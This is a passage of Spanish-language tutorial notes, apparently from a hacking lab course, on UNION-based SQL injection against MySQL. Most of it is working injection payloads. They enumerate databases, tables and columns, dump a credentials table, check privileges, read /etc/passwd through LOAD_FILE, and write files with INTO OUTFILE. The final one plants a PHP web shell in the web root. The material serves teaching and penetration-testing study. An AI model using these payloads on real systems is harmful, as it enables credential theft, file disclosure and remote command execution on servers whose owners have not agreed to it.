Para comenzar con la enumeración, debemos averiguar qué bases de datos están disponibles en el DBMS. 
La tabla SCHEMATA de la base de datos INFORMATION_SCHEMA contiene información sobre todas las bases de datos del servidor. Se utiliza para obtener los nombres de las bases de datos y poder consultarlas. 

La columna SCHEMA_NAME contiene todos los nombres de las bases de datos actualmente presentes.

```shell-session
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```

SI lo hacemos mediante UNION.

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

![image](/assets/img/posts/sql-injection/20251013162809.png)

Si por ejemplo queremos saber en que base de datos no encontramos actualmente.

```sql
cn' UNION select 1,database(),2,3-- -
```

![image](/assets/img/posts/sql-injection/20251013162855.png)


##### Tablas

La tabla **TABLES** contiene información sobre todas las tablas de la base de datos. Esta tabla contiene varias columnas, pero nos interesan **TABLE_SCHEMA** y **TABLE_NAME**.

La columna **TABLE_NAME** almacena los nombres de las tablas, mientras que la columna **TABLE_SCHEMA** apunta a la base de datos a la que pertenece cada tabla. Esto se puede hacer de forma similar a como hemos encontrado los nombres de las bases de datos. 

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

![image](/assets/img/posts/sql-injection/20251013163418.png)

Añadimos una condición (where table_schema=“dev”) para devolver solo las tablas de la base de datos «dev», ya que, de lo contrario, obtendríamos todas las tablas de todas las bases de datos, que pueden ser muchas.

##### Columnas

Para volcar los datos de la tabla de credenciales, primero necesitamos encontrar los nombres de las columnas de la tabla, que se pueden encontrar en la tabla **COLUMNS** de la base de datos **INFORMATION_SCHEMA**. 

La tabla **COLUMNS** contiene información sobre todas las columnas presentes en todas las bases de datos. Esto nos ayuda a encontrar los nombres de las columnas para consultar una tabla. Las columnas **COLUMN_NAME**, **TABLE_NAME** y **TABLE_SCHEMA** se pueden utilizar para lograrlo.

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

![image](/assets/img/posts/sql-injection/20251013164043.png)

##### Datos

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

Hay utilizar el operador punto para hacer referencia a las «credenciales» en la base de datos «dev», ya que estamos ejecutando en la base de datos «ilfreight».

![image](/assets/img/posts/sql-injection/20251013164142.png)


#### Lectura de archivos

##### Privilegios

La lectura de datos es mucho más habitual que la escritura de datos, que está estrictamente reservada a usuarios privilegiados en los DBMS modernos, ya que puede dar lugar a la explotación del sistema.

Por ejemplo, en MySQL, el usuario de la base de datos debe tener el privilegio FILE para cargar el contenido de un archivo en una tabla y, a continuación, volcar los datos de esa tabla y leer los archivos. 

Por lo tanto, comencemos por recopilar datos sobre nuestros privilegios de usuario dentro de la base de dato.

##### DB User

En primer lugar, debemos determinar qué usuario somos dentro de la base de datos. Aunque no necesitamos necesariamente privilegios de administrador de bases de datos (DBA) para leer datos, esto es cada vez más necesario en los DBMS modernos, ya que solo los DBA tienen esos privilegios. 

Lo mismo se aplica a otras bases de datos comunes. Si tenemos privilegios de DBA, es mucho más probable que tengamos privilegios de lectura de archivos. Si no los tenemos, debemos comprobar nuestros privilegios para ver qué podemos hacer. 

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```
```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

##### Privilegios del usuario

```sql
SELECT super_priv FROM mysql.user
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

Si existe más de un usuario en la base de datos;

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

![image](/assets/img/posts/sql-injection/20251013165402.png)

Como vemos devuelve Y, lo que significa yes, si se tienen privilegios de administrador.

También podemos extraer otros privilegios directamente desde el esquema.

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

Al que podemos añadir `WHERE grantee="'root'@'localhost'"` para que sea solo del usuario que somos en este caso.

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

![image](/assets/img/posts/sql-injection/20251013165612.png)


##### LOAD_FILE

La función LOAD_FILE() se puede utilizar en MariaDB / MySQL para leer datos de archivos. 
La función solo admite un argumento, que es el nombre del archivo. 

```sql
SELECT LOAD_FILE('/etc/passwd');
```

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

![image](/assets/img/posts/sql-injection/20251013165857.png)


#### Escritura de archivos

Para poder escribir archivos en el servidor back-end utilizando una base de datos MySQL, necesitamos tres cosas:

- Un usuario con el privilegio FILE habilitado.

- La variable global secure_file_priv de MySQL deshabilitada.

- Acceso de escritura a la ubicación en la que queremos escribir en el servidor back-end.

Ya hemos comprobado que nuestro usuario actual tiene el privilegio FILE necesario para escribir archivos. Ahora debemos comprobar si la base de datos MySQL tiene ese privilegio. Esto se puede hacer comprobando la variable **global secure_file_priv**.

###### secure_file_priv

La variable secure_file_priv se utiliza para determinar desde dónde leer/escribir archivos. 
Un valor vacío nos permite leer archivos de todo el sistema de archivos. Por el contrario, si se establece un directorio determinado, solo podemos leer desde la carpeta especificada por la variable. 

Por otro lado, NULL significa que no podemos leer/escribir desde ningún directorio. 

MariaDB tiene esta variable establecida en vacío por defecto, lo que nos permite leer/escribir en cualquier archivo si el usuario tiene el privilegio FILE. 

Sin embargo, MySQL utiliza /var/lib/mysql-files como carpeta predeterminada. Esto significa que no es posible leer archivos a través de una inyección MySQL con la configuración predeterminada. Peor aún, algunas configuraciones modernas tienen NULL como valor predeterminado, lo que significa que no podemos leer/escribir archivos en ninguna parte del sistema.

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Sin embargo, como estamos utilizando una inyección UNION, tenemos que obtener el valor mediante una instrucción SELECT. Esto no debería suponer ningún problema, ya que todas las variables y la mayoría de las configuraciones se almacenan en la base de datos **INFORMATION_SCHEMA**. 

Las variables globales de MySQL se almacenan en una tabla llamada **global_variables** y, según la documentación, esta tabla tiene dos columnas: **variable_name** y **variable_value**.

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

![image](/assets/img/posts/sql-injection/20251013171734.png)

Como vemos está vacía por lo que podemos leer y escribir ficheros en cualquier lugar.


##### SELECT INTO OUTFILE

La instrucción **SELECT INTO OUTFILE** se puede utilizar para escribir datos de consultas select en archivos. Normalmente se utiliza para exportar datos de tablas.

Para utilizarla, podemos añadir INTO OUTFILE “...” después de nuestra consulta para exportar los resultados al archivo que hayamos especificado.

```shell-session
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```shell-session
$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

También podemos directamente exportar strings haciendo posible crear archivos.

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```shell-session
$ cat /tmp/test.txt 

this is a test
```

```shell-session
$ ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```


> [!NOTE] 
> Las exportaciones de archivos avanzadas utilizan la función «FROM_BASE64(«base64_data»)» para poder escribir archivos largos/avanzados, incluidos datos binarios.


##### Creando una webshell a través de SQL

Para escribir un shell web, debemos conocer el directorio web base del servidor web (es decir, la raíz web). 

Una forma de encontrarlo es utilizar **load_file** para leer la configuración del servidor, como la configuración de Apache que se encuentra en /etc/apache2/apache2.conf, la configuración de Nginx en /etc/nginx/nginx.conf o la configuración de IIS en %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, o podemos buscar otras posibles ubicaciones de configuración. 

Además, podemos ejecutar un escaneo de fuzzing e intentar escribir archivos en diferentes raíces web posibles, utilizando esta lista de palabras para Linux o esta lista de palabras para Windows. Por último, si ninguna de las opciones anteriores funciona, podemos utilizar los errores del servidor que se nos muestran e intentar encontrar el directorio web de esa manera.


```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

